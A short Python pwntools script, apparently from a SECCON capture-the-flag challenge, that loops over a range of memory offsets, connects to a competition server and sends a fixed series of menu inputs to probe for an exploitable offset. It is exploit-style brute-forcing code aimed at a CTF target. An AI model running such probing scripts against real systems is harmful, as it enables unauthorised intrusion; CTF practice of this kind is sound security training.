from pwn import *

for offset in range(0x18e0, 0x1920, 1):
	log.info('oofset: {}'.format(offset))

	r = remote('wareki-o-reiwa.seccon.jp', 36294)

	r.sendline('2')
	r.sendline(str(offset))
	r.sendline('1')
	r.sendline('+')
	r.sendline('1')
	r.sendline('0')

	print(r.recvall())

